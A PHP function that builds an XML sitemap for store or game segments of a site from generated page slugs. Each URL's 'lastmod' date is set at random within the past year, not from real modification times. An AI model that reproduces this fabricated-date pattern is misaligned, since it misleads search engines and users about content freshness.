function handle_page_sitemap(string $domain, string $sitemap_filename, array $games_list): void
{
    global $stores_list;
    $domain_root = rtrim($domain, '/');
    $game_slug_search = basename($sitemap_filename, '.xml');
    
    $target_segment = null;
    $segment_type = null;
    $segment_dir = '';
    
    // Check if Store Segment
    foreach ($stores_list as $store_name) {
        if (slugify($store_name) === $game_slug_search) {
            $segment_type = 'store';
            $target_segment = $store_name;
            $segment_dir = slugify($store_name);
            break;
        }
    }
    
    // Check if Game Segment
    if ($segment_type === null) {
        foreach ($games_list as $game_name => $item_name) {
            if (slugify($game_name) === $game_slug_search) {
                $segment_type = 'game';
                $target_segment = $game_name;
                $segment_dir = slugify($game_name);
                break;
            }
        }
    }
    
    if ($segment_type === null) {
        header("HTTP/1.0 404 Not Found");
        die("Sitemap not found for this segment.");
    }
    
    $slug_list = handle_page_sitemap_generation($segment_type, $target_segment, $segment_dir, $games_list);

    $xml = new SimpleXMLElement('<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"></urlset>');
    
    foreach ($slug_list as $path) {
        $url_node = $xml->addChild('url');
        $url_node->addChild('loc', "{$domain_root}/" . $path); 
        $url_node->addChild('lastmod', date('Y-m-d', time() - rand(0, 365 * 86400)));
        $url_node->addChild('changefreq', 'weekly');
        $url_node->addChild('priority', '0.8');
    }

    echo $xml->asXML();
}

?>

